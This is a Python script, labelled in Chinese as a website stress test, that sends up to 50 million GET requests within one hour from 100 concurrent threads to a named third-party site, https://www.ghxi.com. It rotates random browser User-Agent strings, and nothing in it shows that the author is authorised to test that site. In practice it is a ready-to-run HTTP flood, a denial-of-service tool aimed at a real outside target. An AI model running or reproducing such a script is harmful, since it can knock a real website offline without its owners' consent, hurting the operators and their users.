#!/usr/bin/env python3
"""
网站压力测试脚本
对 https://www.ghxi.com 进行压力测试
"""

import requests
import threading
import time
import random
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta

class LoadTester:
    def __init__(self, url, total_requests=50000000, duration_hours=1, max_workers=100):
        self.url = url
        self.total_requests = total_requests
        self.duration_hours = duration_hours
        self.max_workers = max_workers
        self.success_count = 0
        self.error_count = 0
        self.response_times = []
        self.start_time = None
        self.end_time = None
        self.stop_flag = False
        self.lock = threading.Lock()
        
    def make_request(self):
        """发送单个HTTP请求"""
        try:
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                ])
            }
            
            start_time = time.time()
            response = requests.get(self.url, headers=headers, timeout=10)
            end_time = time.time()
            
            response_time = (end_time - start_time) * 1000  # 转换为毫秒
            
            with self.lock:
                if response.status_code == 200:
                    self.success_count += 1
                else:
                    self.error_count += 1
                self.response_times.append(response_time)
                
            return True
            
        except Exception as e:
            with self.lock:
                self.error_count += 1
            return False
    
    def worker(self, worker_id):
        """工作线程函数"""
        requests_made = 0
        while not self.stop_flag:
            if self.start_time and (time.time() - self.start_time) >= self.duration_hours * 3600:
                break
                
            if self.total_requests > 0:
                with self.lock:
                    if self.success_count + self.error_count >= self.total_requests:
                        break
            
            self.make_request()
            requests_made += 1
            
            # 添加小延迟避免过于频繁的请求
            time.sleep(random.uniform(0.001, 0.01))
            
        return requests_made
    
    def run(self):
        """运行压力测试"""
        print(f"开始压力测试...")
        print(f"目标URL: {self.url}")
        print(f"总请求数: {self.total_requests:,}")
        print(f"测试时长: {self.duration_hours} 小时")
        print(f"最大并发数: {self.max_workers}")
        print("-" * 50)
        
        self.start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # 提交所有任务
            futures = [executor.submit(self.worker, i) for i in range(self.max_workers)]
            
            # 监控进度
            last_report_time = time.time()
            last_success_count = 0
            last_error_count = 0
            
            try:
                while True:
                    # 检查是否完成
                    current_time = time.time()
                    elapsed = current_time - self.start_time
                    
                    if elapsed >= self.duration_hours * 3600:
                        self.stop_flag = True
                        break
                        
                    with self.lock:
                        current_success = self.success_count
                        current_error = self.error_count
                        total_requests = current_success + current_error
                    
                    if self.total_requests > 0 and total_requests >= self.total_requests:
                        self.stop_flag = True
                        break
                    
                    # 每5秒报告一次进度
                    if current_time - last_report_time >= 5:
                        success_rate = (current_success - last_success_count) / 5
                        error_rate = (current_error - last_error_count) / 5
                        
                        print(f"[{elapsed:.1f}s] 成功: {current_success:,} | "
                              f"错误: {current_error:,} | "
                              f"成功率: {success_rate:.1f}/s | "
                              f"错误率: {error_rate:.1f}/s")
                        
                        last_report_time = current_time
                        last_success_count = current_success
                        last_error_count = current_error
                    
                    time.sleep(0.1)
                    
                    # 检查所有任务是否完成
                    if all(future.done() for future in futures):
                        break
                        
            except KeyboardInterrupt:
                print("\n检测到中断信号，停止测试...")
                self.stop_flag = True
        
        self.end_time = time.time()
        self.print_results()
    
    def print_results(self):
        """打印测试结果"""
        total_time = self.end_time - self.start_time
        total_requests = self.success_count + self.error_count
        
        print("\n" + "=" * 50)
        print("压力测试结果")
        print("=" * 50)
        print(f"测试时长: {total_time:.2f} 秒")
        print(f"总请求数: {total_requests:,}")
        print(f"成功请求: {self.success_count:,}")
        print(f"失败请求: {self.error_count:,}")
        print(f"成功率: {(self.success_count/total_requests*100):.2f}%" if total_requests > 0 else "成功率: 0%")
        
        if self.response_times:
            avg_response_time = sum(self.response_times) / len(self.response_times)
            min_response_time = min(self.response_times)
            max_response_time = max(self.response_times)
            
            print(f"平均响应时间: {avg_response_time:.2f} ms")
            print(f"最小响应时间: {min_response_time:.2f} ms")
            print(f"最大响应时间: {max_response_time:.2f} ms")
        
        if total_time > 0:
            rps = total_requests / total_time
            print(f"平均每秒请求数(RPS): {rps:.2f}")
        
        print("=" * 50)

if __name__ == "__main__":
    # 配置参数
    URL = "https://www.ghxi.com"
    TOTAL_REQUESTS = 50000000  # 5000万请求
    DURATION_HOURS = 1  # 1小时
    MAX_WORKERS = 100  # 最大并发数
    
    # 创建并运行测试
    tester = LoadTester(
        url=URL,
        total_requests=TOTAL_REQUESTS,
        duration_hours=DURATION_HOURS,
        max_workers=MAX_WORKERS
    )
    
    try:
        tester.run()
    except KeyboardInterrupt:
        print("\n测试被用户中断")
    except Exception as e:
        print(f"\n测试过程中发生错误: {e}")